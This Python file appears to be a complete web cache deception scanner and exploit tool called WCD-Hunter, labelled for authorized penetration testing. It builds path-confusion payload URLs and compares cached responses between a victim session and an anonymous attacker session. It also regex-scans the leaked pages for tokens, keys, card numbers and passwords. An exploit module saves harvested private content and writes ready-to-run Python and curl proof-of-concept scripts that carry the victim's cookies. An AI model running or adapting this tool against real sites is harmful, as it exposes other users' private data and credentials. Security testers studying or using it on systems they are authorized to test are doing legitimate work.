#!/usr/bin/env python3
r"""
WCD-Hunter v1.0 - Web Cache Deception Vulnerability Scanner
Authorized penetration testing use only.

Techniques covered:
  * Extension appending          /profile  -> /profile.css
  * Delimiter confusion          /profile  -> /profile;x.css
  * Fake path segment            /profile  -> /profile/x.css
  * Path traversal + extension   /profile  -> /profile/..%2Fx.css
  * Encoded delimiter variants   %3B %23 %3F %00 %0A %09
  * Double-extension             /profile  -> /profile.php.css
  * Backslash confusion          /profile  -> /profile\.css

Two-session verification:
  Victim session primes the cache -> attacker session (no cookies)
  reads the cached private content. Definitive proof of WCD.
"""

import argparse
import difflib
import hashlib
import html
import json
import os
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin, quote, unquote

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn, TimeElapsedColumn
from rich.text import Text
from rich.rule import Rule
from rich import box

# ──────────────────────────────────────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────────────────────────────────────

VERSION = "1.0.0"

BANNER = rf"""
[bold cyan]
 ██╗    ██╗ ██████╗██████╗      ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
 ██║    ██║██╔════╝██╔══██╗     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
 ██║ █╗ ██║██║     ██║  ██║     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
 ██║███╗██║██║     ██║  ██║     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
 ╚███╔███╔╝╚██████╗██████╔╝     ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚══╝╚══╝  ╚═════╝╚═════╝      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝[/bold cyan]
[dim]  Web Cache Deception Scanner v{VERSION}  •  Authorized Penetration Testing Only[/dim]
"""

# Cache provider fingerprints: header → (HIT values, MISS values)
CACHE_PROVIDERS: Dict[str, Dict] = {
    "Cloudflare": {
        "id_headers":  ["cf-ray", "cf-cache-status"],
        "status_header": "cf-cache-status",
        "hit_vals":    ["HIT", "REVALIDATED", "UPDATING"],
        "miss_vals":   ["MISS", "BYPASS", "EXPIRED", "DYNAMIC"],
    },
    "Varnish": {
        "id_headers":  ["x-varnish"],
        "status_header": "x-cache",
        "hit_vals":    ["HIT"],
        "miss_vals":   ["MISS"],
    },
    "Fastly": {
        "id_headers":  ["x-served-by", "x-cache-hits"],
        "status_header": "x-cache",
        "hit_vals":    ["HIT"],
        "miss_vals":   ["MISS"],
    },
    "Akamai": {
        "id_headers":  ["x-check-cacheable", "akamai-cache-status", "x-akamai-request-id"],
        "status_header": "x-check-cacheable",
        "hit_vals":    ["YES", "HIT", "TCP_HIT", "TCP_MEM_HIT"],
        "miss_vals":   ["NO", "MISS", "TCP_MISS"],
    },
    "AWS CloudFront": {
        "id_headers":  ["x-amz-cf-id", "x-amz-cf-pop"],
        "status_header": "x-cache",
        "hit_vals":    ["Hit from cloudfront"],
        "miss_vals":   ["Miss from cloudfront", "RefreshHit from cloudfront"],
    },
    "Nginx": {
        "id_headers":  ["x-nginx-cache", "x-cache-status"],
        "status_header": "x-cache-status",
        "hit_vals":    ["HIT"],
        "miss_vals":   ["MISS", "BYPASS", "EXPIRED", "UPDATING"],
    },
    "Squid": {
        "id_headers":  ["x-squid-error", "x-cache"],
        "status_header": "x-cache",
        "hit_vals":    ["HIT"],
        "miss_vals":   ["MISS"],
    },
    "Azure CDN": {
        "id_headers":  ["x-ms-ref", "x-ec-custom-error"],
        "status_header": "x-cache",
        "hit_vals":    ["HIT", "TCP_HIT"],
        "miss_vals":   ["MISS", "TCP_MISS"],
    },
}

CACHEABLE_EXTENSIONS = [
    ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".ico", ".svg",
    ".woff", ".woff2", ".ttf", ".eot", ".otf",
    ".htm", ".html", ".xml",
    ".pdf", ".txt", ".map", ".webp", ".avif", ".mp4",
]

# (label, delimiter, placement)
# placement: "suffix" = appended after path, "inject" = inserted before extension
DELIMITER_TECHNIQUES = [
    ("semicolon",           ";",      "suffix"),
    ("encoded-semicolon",   "%3B",    "suffix"),
    ("encoded-hash",        "%23",    "suffix"),
    ("encoded-question",    "%3F",    "suffix"),
    ("null-byte",           "%00",    "suffix"),
    ("newline",             "%0A",    "suffix"),
    ("tab",                 "%09",    "suffix"),
    ("pipe",                "%7C",    "suffix"),
    ("backslash",           "\\",     "suffix"),
    ("encoded-backslash",   "%5C",    "suffix"),
    ("double-slash",        "//",     "suffix"),
]

# Sensitive content regex patterns
SENSITIVE_PATTERNS: Dict[str, str] = {
    "Email":           r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",
    "JWT":             r"eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+",
    "Bearer Token":    r"Bearer\s+[a-zA-Z0-9_\-\.]{20,}",
    "API Key":         r"""(?:api[_\-]?key|apikey|api[_\-]?token)["'\s:=]+([a-zA-Z0-9_\-]{20,})""",
    "AWS Key ID":      r"AKIA[0-9A-Z]{16}",
    "GitHub Token":    r"gh[pousr]_[a-zA-Z0-9]{36}",
    "Slack Token":     r"xox[baprs]-[a-zA-Z0-9\-]{20,}",
    "Google API Key":  r"AIza[0-9A-Za-z_\-]{35}",
    "Credit Card":     r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6011[0-9]{12})\b",
    "SSN":             r"\b\d{3}-\d{2}-\d{4}\b",
    "CSRF Token":      r"""(?:csrf[_\-]?token|_token|authenticity_token)["'\s:=]+([a-zA-Z0-9_\-]{20,})""",
    "Session ID":      r"""(?:PHPSESSID|JSESSIONID|ASP\.NET_SessionId|sid)["'\s:=]+([a-zA-Z0-9_\-\.]{16,})""",
    "Private Key":     r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----",
    "Internal IP":     r"\b(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}\b",
    "Username Field":  r""""(?:username|user|login)":\s*"([^"]{3,})\"""",
    "Password Field":  r""""(?:password|passwd|pwd)":\s*"([^"]{3,})\"""",
}

console = Console()

# ──────────────────────────────────────────────────────────────────────────────
# Dataclasses
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class CacheInfo:
    provider: str = "Unknown"
    status: str = ""          # HIT / MISS / BYPASS / etc.
    is_hit: bool = False
    age: int = 0
    cache_control: str = ""
    relevant_headers: Dict[str, str] = field(default_factory=dict)

@dataclass
class SensitiveFinding:
    pattern: str
    value: str
    context: str

@dataclass
class WCDResult:
    original_url: str
    payload_url: str
    technique: str
    extension: str
    delimiter: str
    http_status_victim: int
    http_status_attacker: int
    cache_info_victim: CacheInfo
    cache_info_attacker: CacheInfo
    content_similarity: float          # 0.0–1.0
    response_size_victim: int
    response_size_attacker: int
    time_victim: float
    time_attacker: float
    sensitive_findings: List[SensitiveFinding]
    cache_hit_confirmed: bool
    vulnerable: bool
    confidence: str                    # HIGH / MEDIUM / LOW
    evidence_notes: List[str]
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class ScanSession:
    target: str
    start_time: str = field(default_factory=lambda: datetime.now().isoformat())
    end_time: str = ""
    cache_provider: str = "Unknown"
    urls_tested: int = 0
    payloads_sent: int = 0
    vulnerable: List[WCDResult] = field(default_factory=list)
    all_results: List[WCDResult] = field(default_factory=list)

# ──────────────────────────────────────────────────────────────────────────────
# Cache Fingerprinter
# ──────────────────────────────────────────────────────────────────────────────

class CacheFingerprinter:
    """Detects cache provider and hit/miss status from HTTP response headers."""

    def fingerprint(self, response: requests.Response) -> CacheInfo:
        info = CacheInfo()
        lower_headers = {k.lower(): v for k, v in response.headers.items()}

        # Identify provider
        for provider, sig in CACHE_PROVIDERS.items():
            if any(h in lower_headers for h in sig["id_headers"]):
                info.provider = provider
                sh = sig["status_header"]
                if sh in lower_headers:
                    status_val = lower_headers[sh]
                    info.status = status_val
                    info.is_hit = any(
                        hv.lower() in status_val.lower() for hv in sig["hit_vals"]
                    )
                break

        # Fallback: generic x-cache
        if info.provider == "Unknown" and "x-cache" in lower_headers:
            info.provider = "Generic CDN"
            info.status = lower_headers["x-cache"]
            info.is_hit = "hit" in info.status.lower()

        # Age header — supplementary cache evidence. Only treat it as a hit when
        # no provider status header gave an explicit verdict (some caches set Age
        # without a status header). Never override an explicit MISS/BYPASS.
        if "age" in lower_headers:
            try:
                info.age = int(lower_headers["age"])
                if info.age > 0 and not info.status:
                    info.is_hit = True
                    info.status = f"Age={info.age}"
            except ValueError:
                pass

        # Collect relevant headers for evidence
        relevant = [
            "cf-cache-status", "x-cache", "x-cache-status", "age",
            "cache-control", "x-varnish", "x-served-by", "x-amz-cf-id",
            "x-cache-hits", "vary", "surrogate-control", "x-check-cacheable",
        ]
        info.relevant_headers = {
            k: v for k, v in lower_headers.items() if k in relevant
        }
        info.cache_control = lower_headers.get("cache-control", "")

        return info

# ──────────────────────────────────────────────────────────────────────────────
# Payload Generator
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class Payload:
    url: str
    technique: str
    extension: str
    delimiter: str

class PayloadGenerator:
    """Generates all WCD test payloads for a target URL."""

    def __init__(self, extensions: Optional[List[str]] = None,
                 quick: bool = False):
        self.extensions = extensions or (
            [".css", ".js", ".png", ".ico"] if quick else CACHEABLE_EXTENSIONS
        )

    def generate(self, url: str) -> List[Payload]:
        payloads: List[Payload] = []
        base = url.rstrip("/")
        parsed = urlparse(base)
        path = parsed.path.rstrip("/") or "/"

        for ext in self.extensions:
            # ── Technique 1: Direct extension append ─────────────────────────
            payloads.append(Payload(
                url=base + ext,
                technique="ext-append",
                extension=ext,
                delimiter="",
            ))

            # ── Technique 2: Fake path segment ───────────────────────────────
            payloads.append(Payload(
                url=base + "/wcd_static" + ext,
                technique="fake-path",
                extension=ext,
                delimiter="/",
            ))

            # ── Technique 3: Path traversal + extension ───────────────────────
            payloads.append(Payload(
                url=base + "/..%2Fwcd_static" + ext,
                technique="path-traversal",
                extension=ext,
                delimiter="/..%2F",
            ))
            payloads.append(Payload(
                url=base + "%2F..%2Fwcd_static" + ext,
                technique="path-traversal-encoded",
                extension=ext,
                delimiter="%2F..%2F",
            ))

            # ── Technique 4: Delimiter-based confusion ────────────────────────
            for delim_name, delim_char, _ in DELIMITER_TECHNIQUES:
                payloads.append(Payload(
                    url=base + delim_char + "wcd_static" + ext,
                    technique=f"delimiter-{delim_name}",
                    extension=ext,
                    delimiter=delim_char,
                ))

            # ── Technique 5: Double-extension ────────────────────────────────
            # e.g. /profile.php.css — tricks rules matching on first extension
            common_dynamic = [".php", ".asp", ".jsp", ".py", ".rb"]
            for dyn in common_dynamic[:2]:  # limit to 2 to reduce noise
                payloads.append(Payload(
                    url=base + dyn + ext,
                    technique="double-ext",
                    extension=ext,
                    delimiter=dyn,
                ))

            # ── Technique 6: Backslash path confusion ─────────────────────────
            payloads.append(Payload(
                url=base + "\\" + "wcd_static" + ext,
                technique="backslash",
                extension=ext,
                delimiter="\\",
            ))

        return payloads

# ──────────────────────────────────────────────────────────────────────────────
# Sensitive Content Detector
# ──────────────────────────────────────────────────────────────────────────────

class SensitiveDetector:
    def scan(self, content: str) -> List[SensitiveFinding]:
        findings: List[SensitiveFinding] = []
        for pattern_name, pattern in SENSITIVE_PATTERNS.items():
            try:
                for match in re.finditer(pattern, content, re.IGNORECASE):
                    value = match.group(0)
                    # Grab 60 chars of context
                    start = max(0, match.start() - 40)
                    end = min(len(content), match.end() + 40)
                    context = content[start:end].replace("\n", " ").strip()
                    findings.append(SensitiveFinding(
                        pattern=pattern_name,
                        value=value[:120],
                        context=context[:200],
                    ))
                    if len(findings) > 50:  # cap per url
                        return findings
            except re.error:
                pass
        return findings

# ──────────────────────────────────────────────────────────────────────────────
# WCD Tester
# ──────────────────────────────────────────────────────────────────────────────

class WCDTester:
    def __init__(
        self,
        victim_session: requests.Session,
        attacker_session: requests.Session,
        timeout: int = 15,
        delay: float = 0.0,
        verify_ssl: bool = False,
        verbose: bool = False,
    ):
        self.victim   = victim_session
        self.attacker = attacker_session
        self.timeout  = timeout
        self.delay    = delay
        self.verify   = verify_ssl
        self.verbose  = verbose
        self.fp       = CacheFingerprinter()
        self.detector = SensitiveDetector()
        self._lock    = threading.Lock()

    def _get(self, session: requests.Session, url: str) -> Tuple[Optional[requests.Response], float]:
        t0 = time.perf_counter()
        try:
            r = session.get(url, timeout=self.timeout, verify=self.verify,
                            allow_redirects=True)
            elapsed = time.perf_counter() - t0
            return r, elapsed
        except Exception as e:
            if self.verbose:
                console.print(f"[dim red]  Request failed {url}: {e}[/dim red]")
            return None, 0.0

    def _similarity(self, a: str, b: str) -> float:
        if not a or not b:
            return 0.0
        return difflib.SequenceMatcher(None, a[:4096], b[:4096]).ratio()

    def _endpoint_is_private(self, victim_body: str, victim_status: int,
                             attacker_body: str, attacker_status: int) -> bool:
        """True when the original URL serves private (authenticated) content.

        An endpoint is private when an unauthenticated attacker cannot see the
        same page the victim sees — blocked outright, redirected (e.g. to
        /login), or served meaningfully different content.
        """
        if attacker_status in (401, 403):
            return True
        if attacker_status in (301, 302, 303, 307, 308) and victim_status < 400:
            return True
        return self._similarity(victim_body, attacker_body) < 0.70

    def _baseline(self, original_url: str) -> Optional[dict]:
        """Fetch the original URL once as victim and once as attacker.

        Computed once per URL (not per payload) and used as the anti-false-
        positive anchor for every payload targeting that URL.
        """
        rv, _ = self._get(self.victim, original_url)
        if rv is None:
            return None
        ra, _ = self._get(self.attacker, original_url)
        if ra is None:
            return None
        return {
            "victim_body": rv.text,
            "victim_status": rv.status_code,
            "attacker_body": ra.text,
            "attacker_status": ra.status_code,
        }

    def test_payload(self, original_url: str, payload: Payload,
                     baseline: Optional[dict] = None) -> WCDResult:
        evidence_notes: List[str] = []

        # ── Baseline: authenticated vs anonymous view of the ORIGINAL URL ────
        # Proves whether the endpoint is private before we claim the cache
        # leaked anything. This is the key false-positive guard.
        if baseline is None:
            baseline = self._baseline(original_url)
        if baseline is None:
            return self._null_result(original_url, payload)

        victim_orig_body     = baseline["victim_body"]
        victim_orig_status   = baseline["victim_status"]
        attacker_orig_body   = baseline["attacker_body"]
        attacker_orig_status = baseline["attacker_status"]

        private = self._endpoint_is_private(
            victim_orig_body, victim_orig_status,
            attacker_orig_body, attacker_orig_status,
        )

        if self.delay:
            time.sleep(self.delay)

        # ── Victim primes the cache with the payload URL ──────────────────────
        rv_payload, t_victim = self._get(self.victim, payload.url)
        if rv_payload is None:
            return self._null_result(original_url, payload)

        victim_ci   = self.fp.fingerprint(rv_payload)
        victim_body = rv_payload.text
        victim_size = len(rv_payload.content)

        if victim_ci.is_hit:
            evidence_notes.append(f"Victim request: cache HIT ({victim_ci.status}) — already cached by prior request")
        else:
            evidence_notes.append(f"Victim request: cache MISS ({victim_ci.status}) — payload URL was served and may be stored")

        if self.delay:
            time.sleep(self.delay)

        # ── Attacker fetches the same payload URL (no cookies) ────────────────
        ra_payload, t_attacker = self._get(self.attacker, payload.url)
        if ra_payload is None:
            return self._null_result(original_url, payload)

        attacker_ci   = self.fp.fingerprint(ra_payload)
        attacker_body = ra_payload.text
        attacker_size = len(ra_payload.content)

        # ── Analysis: three relationships that together prove WCD ─────────────
        # served_private   = payload URL actually returned the victim's private page
        # got_private      = attacker received the victim's private page
        # cache_consistent = victim & attacker payload responses match (cache worked)
        served_private   = self._similarity(victim_orig_body, victim_body)
        got_private      = self._similarity(victim_orig_body, attacker_body)
        cache_consistent = self._similarity(victim_body, attacker_body)

        cache_hit = attacker_ci.is_hit
        sens_a    = self.detector.scan(attacker_body)
        sensitive = sens_a if sens_a else self.detector.scan(victim_body)

        served_ok = served_private >= 0.85
        got_ok    = got_private >= 0.85
        status_ok = rv_payload.status_code < 400 and ra_payload.status_code < 400

        vulnerable = False
        confidence = "LOW"

        if not private:
            anon_sim = self._similarity(victim_orig_body, attacker_orig_body)
            evidence_notes.append(
                f"Endpoint is public — anonymous view is {anon_sim:.0%} identical to "
                "authenticated view; caching here leaks nothing. Not WCD."
            )
        elif cache_hit and got_ok and served_ok and status_ok:
            vulnerable = True
            confidence = "HIGH" if sens_a else "MEDIUM"
            evidence_notes.append(
                f"Attacker retrieved cached private content: {got_private:.0%} match to the "
                f"victim's authenticated page, cache {attacker_ci.status or 'HIT'}"
                + (f", {len(sens_a)} sensitive pattern(s) found" if sens_a else ", no secrets matched")
            )
        elif cache_hit and (got_ok or served_ok) and status_ok:
            vulnerable = True
            confidence = "MEDIUM"
            evidence_notes.append(
                f"Partial evidence: cache HIT but served_private={served_private:.0%} / "
                f"got_private={got_private:.0%} — manual verification recommended"
            )
        elif not cache_hit and got_ok and served_ok and status_ok and attacker_ci.age > 0:
            vulnerable = True
            confidence = "MEDIUM"
            evidence_notes.append(
                f"Age={attacker_ci.age}s with {got_private:.0%} private-content match — "
                "likely cached although no cache-status header was present"
            )
        else:
            evidence_notes.append(
                f"Not vulnerable: private={private}, cache={attacker_ci.status or 'MISS'}, "
                f"served_private={served_private:.0%}, got_private={got_private:.0%}"
            )

        return WCDResult(
            original_url        = original_url,
            payload_url         = payload.url,
            technique           = payload.technique,
            extension           = payload.extension,
            delimiter           = payload.delimiter,
            http_status_victim  = rv_payload.status_code,
            http_status_attacker= ra_payload.status_code,
            cache_info_victim   = victim_ci,
            cache_info_attacker = attacker_ci,
            content_similarity  = round(got_private, 4),
            response_size_victim   = victim_size,
            response_size_attacker = attacker_size,
            time_victim    = round(t_victim, 3),
            time_attacker  = round(t_attacker, 3),
            sensitive_findings = sensitive,
            cache_hit_confirmed= cache_hit,
            vulnerable     = vulnerable,
            confidence     = confidence,
            evidence_notes = evidence_notes,
        )

    def _null_result(self, original_url: str, payload: Payload) -> WCDResult:
        return WCDResult(
            original_url=original_url, payload_url=payload.url,
            technique=payload.technique, extension=payload.extension,
            delimiter=payload.delimiter,
            http_status_victim=0, http_status_attacker=0,
            cache_info_victim=CacheInfo(), cache_info_attacker=CacheInfo(),
            content_similarity=0.0, response_size_victim=0,
            response_size_attacker=0, time_victim=0.0, time_attacker=0.0,
            sensitive_findings=[], cache_hit_confirmed=False,
            vulnerable=False, confidence="LOW",
            evidence_notes=["Request failed — skipped"],
        )

# ──────────────────────────────────────────────────────────────────────────────
# Report Generator
# ──────────────────────────────────────────────────────────────────────────────

class ReportGenerator:
    def json_report(self, session: ScanSession, path: str) -> None:
        data = {
            "tool": f"WCD-Hunter v{VERSION}",
            "target": session.target,
            "scan_start": session.start_time,
            "scan_end": session.end_time,
            "cache_provider": session.cache_provider,
            "stats": {
                "urls_tested": session.urls_tested,
                "payloads_sent": session.payloads_sent,
                "vulnerable_endpoints": len(session.vulnerable),
            },
            "findings": [self._result_dict(r) for r in session.vulnerable],
        }
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, default=str)

    def _result_dict(self, r: WCDResult) -> dict:
        return {
            "url": r.original_url,
            "payload_url": r.payload_url,
            "technique": r.technique,
            "extension": r.extension,
            "delimiter": r.delimiter,
            "confidence": r.confidence,
            "vulnerable": r.vulnerable,
            "cache_hit_confirmed": r.cache_hit_confirmed,
            "content_similarity_pct": f"{r.content_similarity*100:.1f}%",
            "http_status_victim": r.http_status_victim,
            "http_status_attacker": r.http_status_attacker,
            "cache_provider_victim": r.cache_info_victim.provider,
            "cache_status_victim": r.cache_info_victim.status,
            "cache_status_attacker": r.cache_info_attacker.status,
            "sensitive_findings": [
                {"pattern": f.pattern, "value": f.value, "context": f.context}
                for f in r.sensitive_findings
            ],
            "evidence_notes": r.evidence_notes,
            "response_size_victim": r.response_size_victim,
            "response_size_attacker": r.response_size_attacker,
            "response_time_victim_s": r.time_victim,
            "response_time_attacker_s": r.time_attacker,
            "timestamp": r.timestamp,
        }

    def html_report(self, session: ScanSession, path: str) -> None:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        findings_html = ""
        for idx, r in enumerate(session.vulnerable, 1):
            conf_color = {"HIGH": "#e53935", "MEDIUM": "#fb8c00", "LOW": "#fdd835"}.get(r.confidence, "#888")
            sens_rows  = "".join(
                f"<tr><td>{html.escape(f.pattern)}</td><td><code>{html.escape(f.value)}</code></td>"
                f"<td>{html.escape(f.context)}</td></tr>"
                for f in r.sensitive_findings
            )
            sens_table = (
                f"<table class='sensitive-table'><tr><th>Pattern</th><th>Value</th><th>Context</th></tr>"
                f"{sens_rows}</table>" if r.sensitive_findings else "<em>No sensitive patterns matched</em>"
            )
            headers_html = "".join(
                f"<tr><td>{html.escape(k)}</td><td>{html.escape(v)}</td></tr>"
                for k, v in (r.cache_info_attacker.relevant_headers or {}).items()
            )
            evidence_list = "".join(f"<li>{html.escape(n)}</li>" for n in r.evidence_notes)
            findings_html += f"""
            <div class="finding" id="finding-{idx}">
              <div class="finding-header" style="border-left:4px solid {conf_color}">
                <div>
                  <span class="badge" style="background:{conf_color}">{r.confidence}</span>
                  <span class="finding-title">Finding #{idx} — {html.escape(r.technique)}</span>
                </div>
                <span class="cache-hit">Cache HIT: {'✓ YES' if r.cache_hit_confirmed else '✗ NO'}</span>
              </div>
              <div class="finding-body">
                <table class="meta-table">
                  <tr><td>Original URL</td><td><code>{html.escape(r.original_url)}</code></td></tr>
                  <tr><td>Payload URL</td><td><code>{html.escape(r.payload_url)}</code></td></tr>
                  <tr><td>Extension</td><td><code>{html.escape(r.extension)}</code></td></tr>
                  <tr><td>Delimiter</td><td><code>{html.escape(r.delimiter or "none")}</code></td></tr>
                  <tr><td>Content Similarity</td><td>{r.content_similarity*100:.1f}%</td></tr>
                  <tr><td>Victim Status</td><td>HTTP {r.http_status_victim} ({r.cache_info_victim.status or "—"})</td></tr>
                  <tr><td>Attacker Status</td><td>HTTP {r.http_status_attacker} ({r.cache_info_attacker.status or "—"})</td></tr>
                  <tr><td>Response Sizes</td><td>Victim {r.response_size_victim:,}B / Attacker {r.response_size_attacker:,}B</td></tr>
                </table>
                <h4>Cache Headers (Attacker Response)</h4>
                <table class="meta-table">{headers_html}</table>
                <h4>Evidence Notes</h4>
                <ul>{evidence_list}</ul>
                <h4>Sensitive Content Detected</h4>
                {sens_table}
              </div>
            </div>"""

        not_vuln_count = session.payloads_sent - len(session.vulnerable)
        html_out = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WCD-Hunter Report — {html.escape(session.target)}</title>
<style>
  :root{{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#e6edf3;--dim:#8b949e;
        --red:#e53935;--orange:#fb8c00;--yellow:#fdd835;--green:#4caf50;--blue:#58a6ff;}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:"Segoe UI",system-ui,sans-serif;font-size:14px;line-height:1.6}}
  header{{background:#0d1117;border-bottom:1px solid var(--border);padding:24px 32px}}
  header h1{{font-size:22px;color:var(--blue);font-family:monospace}}
  header .meta{{color:var(--dim);font-size:13px;margin-top:6px}}
  .container{{max-width:1200px;margin:0 auto;padding:24px 32px}}
  .stat-grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;margin-bottom:28px}}
  .stat-card{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:18px;text-align:center}}
  .stat-card .value{{font-size:32px;font-weight:700;color:var(--blue);font-family:monospace}}
  .stat-card .label{{font-size:12px;color:var(--dim);margin-top:4px;text-transform:uppercase;letter-spacing:.5px}}
  .finding{{background:var(--card);border:1px solid var(--border);border-radius:8px;margin-bottom:20px;overflow:hidden}}
  .finding-header{{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;background:#1c2128}}
  .finding-title{{font-family:monospace;font-size:15px;margin-left:10px}}
  .cache-hit{{font-size:12px;color:var(--dim)}}
  .finding-body{{padding:18px}}
  .finding-body h4{{color:var(--blue);margin:16px 0 8px;font-size:13px;text-transform:uppercase;letter-spacing:.5px}}
  .finding-body h4:first-child{{margin-top:0}}
  .badge{{display:inline-block;padding:2px 10px;border-radius:12px;font-size:11px;font-weight:700;color:#fff;text-transform:uppercase}}
  table{{width:100%;border-collapse:collapse;font-size:13px}}
  th,td{{padding:8px 12px;border:1px solid var(--border);text-align:left;vertical-align:top}}
  th{{background:#1c2128;color:var(--dim);font-weight:600;font-size:11px;text-transform:uppercase}}
  code{{background:#1c2128;padding:2px 6px;border-radius:4px;font-family:monospace;font-size:12px;word-break:break-all}}
  ul{{padding-left:20px}}
  li{{margin-bottom:4px;color:var(--dim)}}
  .sensitive-table td:nth-child(2){{font-family:monospace;word-break:break-all}}
  .no-findings{{text-align:center;padding:60px;color:var(--dim)}}
  .section-title{{font-size:18px;font-weight:600;margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border)}}
  footer{{text-align:center;padding:24px;color:var(--dim);font-size:12px;border-top:1px solid var(--border);margin-top:32px}}
</style>
</head>
<body>
<header>
  <h1>WCD-Hunter — Web Cache Deception Report</h1>
  <div class="meta">
    Target: <strong>{html.escape(session.target)}</strong> &nbsp;|&nbsp;
    Cache Provider: <strong>{html.escape(session.cache_provider)}</strong> &nbsp;|&nbsp;
    Scan: {html.escape(session.start_time[:19].replace("T"," "))} → {html.escape((session.end_time or ts)[:19].replace("T"," "))}
  </div>
</header>
<div class="container">
  <div class="stat-grid">
    <div class="stat-card"><div class="value">{session.urls_tested}</div><div class="label">URLs Tested</div></div>
    <div class="stat-card"><div class="value">{session.payloads_sent}</div><div class="label">Payloads Sent</div></div>
    <div class="stat-card" style="border-color:{'#e53935' if session.vulnerable else '#30363d'}">
      <div class="value" style="color:{'#e53935' if session.vulnerable else '#4caf50'}">{len(session.vulnerable)}</div>
      <div class="label">Vulnerable</div>
    </div>
    <div class="stat-card"><div class="value">{html.escape(session.cache_provider)}</div><div class="label">Cache Provider</div></div>
  </div>
  <div class="section-title">Vulnerability Findings</div>
  {findings_html if findings_html else '<div class="no-findings">No WCD vulnerabilities confirmed.</div>'}
</div>
<footer>Generated by WCD-Hunter v{VERSION} &nbsp;|&nbsp; {ts} &nbsp;|&nbsp; Authorized use only</footer>
</body>
</html>"""

        with open(path, "w", encoding="utf-8") as f:
            f.write(html_out)

# ──────────────────────────────────────────────────────────────────────────────
# Exploitation Module
# ──────────────────────────────────────────────────────────────────────────────

class ExploitModule:
    """Turns confirmed findings into demonstrable proof-of-impact.

    For each confirmed vulnerable endpoint it:
      1. Harvests the cached private content live with the unauthenticated
         attacker session and saves it as evidence.
      2. Writes a reusable two-phase PoC (curl + Python) that primes the cache
         as the victim and steals the response as the attacker.
    """

    _POC_TEMPLATE = '''#!/usr/bin/env python3
"""WCD exploit PoC — {technique} on {original_url}

Two-phase Web Cache Deception:
  1. Authenticated victim requests the payload URL -> cache is primed.
  2. Unauthenticated attacker requests the same URL -> receives the cached
     private page.

Authorized penetration testing use only.
"""
import requests

TARGET  = "{payload_url}"
COOKIES = "{cookies}"

victim   = requests.Session()
attacker = requests.Session()

# Phase 1: prime the cache as the authenticated victim
r1 = victim.get(TARGET, headers={{"Cookie": COOKIES}}, verify=False, allow_redirects=True)
print("[1] victim prime   ->", r1.status_code, "cache:", r1.headers.get("cf-cache-status", ""))

# Phase 2: steal the cached private page as an unauthenticated attacker
r2 = attacker.get(TARGET, verify=False, allow_redirects=True)
print("[2] attacker steal ->", r2.status_code, "cache:", r2.headers.get("cf-cache-status", ""))

with open("stolen.html", "w", encoding="utf-8") as f:
    f.write(r2.text)
print("[+] saved", len(r2.content), "bytes to stolen.html")
'''

    def __init__(self, victim_session: requests.Session,
                 attacker_session: requests.Session,
                 timeout: int = 15, verify: bool = False):
        self.victim   = victim_session
        self.attacker = attacker_session
        self.timeout  = timeout
        self.verify   = verify
        self.fp       = CacheFingerprinter()
        self.detector = SensitiveDetector()

    def _harvest(self, r: WCDResult) -> dict:
        """Re-fetch the payload URL as the attacker and capture cache state."""
        out = {
            "payload_url": r.payload_url,
            "technique": r.technique,
            "original_url": r.original_url,
        }
        try:
            resp = self.attacker.get(r.payload_url, timeout=self.timeout,
                                     verify=self.verify, allow_redirects=True)
            ci = self.fp.fingerprint(resp)
            out.update({
                "status": resp.status_code,
                "cache_status": ci.status or "—",
                "cache_hit": ci.is_hit,
                "age": ci.age,
                "size": len(resp.content),
                "sensitive": [
                    {"pattern": f.pattern, "value": f.value}
                    for f in self.detector.scan(resp.text)
                ],
                "relevant_headers": ci.relevant_headers,
            })
            out["body"] = resp.text
        except Exception as e:
            out["error"] = str(e)
        return out

    def _curl_poc(self, r: WCDResult) -> str:
        cookie_hdr = "; ".join(f"{c.name}={c.value}" for c in self.victim.cookies)
        return "\n".join([
            "#!/usr/bin/env bash",
            f"# WCD PoC — {r.technique} on {r.original_url}",
            "# Phase 1: prime the cache as the authenticated victim.",
            f"curl -sk '{r.payload_url}' -H 'Cookie: {cookie_hdr}' -o victim_primed.html",
            "# Phase 2: steal the cached private page as an unauthenticated attacker.",
            f"curl -sk '{r.payload_url}' -D - -o stolen.html",
            "",
            "echo '--- stolen.html (attacker, no cookies) ---'",
            "head -c 2000 stolen.html",
        ]) + "\n"

